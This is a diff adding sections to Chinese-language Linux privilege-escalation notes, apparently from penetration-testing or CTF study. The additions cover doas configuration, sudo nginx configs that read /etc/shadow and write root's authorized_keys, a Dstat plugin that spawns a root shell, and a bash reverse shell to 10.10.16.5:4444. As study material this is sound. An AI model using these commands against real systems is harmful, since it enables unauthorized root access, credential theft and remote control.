@@ -134,6 +134,26 @@ sudo -l查看当前用户可以使用的命令
 
 https://gtfobins.github.io/ 
 
+## doas
+
+doas是sudo的替代品
+
+默认情况安装到`/usr/local/bin`，其配置文件在`/usr/local/etc/doas.conf`
+
+doas.conf的语法
+
+```
+permit|deny [options] identity [as target] [cmd command [args ...]]
+```
+
+options包括
+
+> 1. nopass，执行命令时不需要输入密码
+> 2. nolog，命令执行成功时不会记录
+> 3. persist，授权后，一段时间内不会要求再次输入密码
+> 4. keepenv，如果没有其他说明，保持环境变量不变
+> 5. setenv，设置临时的环境变量，具体方法为 `setenv { -ENV PS1=$DOAS_PS1 SSH_AUTH_SOCK }`
+
 ## nmap
 
 ### Nmap Interactive Mode Nmap 交互模式
@@ -509,6 +529,91 @@ systemctl enable --now /dev/shm/mm.service
 
 这个时候可以在攻击机上看到反弹回的高权限shell
 
+## nginx
+
+### 文件读取
+
+具有nginx的suid权限
+
+编辑nginx配置文件，以root用户运行，映射到1337端口
+
+```
+nginx1.conf
+
+user root;
+events {
+    worker_connections 1024;
+}
+http {
+    server {
+        listen 1337;
+        root /;
+        autoindex on;
+    }
+}
+```
+
+```
+sudo /usr/sbin/nginx -c /home/user/nginx1.conf
+```
+
+```
+可以读取到敏感文件
+curl localhost:1337/etc/shadow
+```
+
+### 文件写入
+
+配置文件加入PUT请求
+
+```
+user root;
+events {
+    worker_connections 1024;
+}
+http {
+    server {
+        listen 1338;
+        root /;
+        autoindex on;
+        dav_methods PUT;
+    }
+}
+```
+
+```
+sudo /usr/sbin/nginx -c /home/user/nginx2.conf
+```
+
+可以进行文件写入，将本地root用户的公钥写入，使用ssh连接
+
+```
+curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'id_rsa.pub'
+ssh -i ~/.ssh/id_rsa root@10.10.11.243
+```
+
+## Dstat提权
+
+Dstat有个功能就是提供了用户自定义插件（python脚本）的功能
+
+插件位置
+
+```
+/usr/share/dstat/
+/usr/local/share/dstat/
+```
+
+可以在插件位置写入插件（提权脚本），使用sudo命令运行dstat插件
+
+```python
+import os
+os.system("/bin/bash")
+```
+
+<font color=red>脚本的命名格式`dstat_xxx.py`</font>
+
+使用sudo来调用这个插件，即可得到root权限
+
 # 脏牛提权
 
 利用探针脚本检测存在的漏洞
@@ -570,5 +675,10 @@ return 0;
 ```
 将用户权限写进/etc/sudoers
 echo "echo 'www-data ALL=(ALL) NOPASSWD:ALL >>/etc/sudoers' " >update
+```
+
+```
+#! /bin/bash
+bash -i &> /dev/tcp/10.10.16.5/4444 0>&1
 ```
 
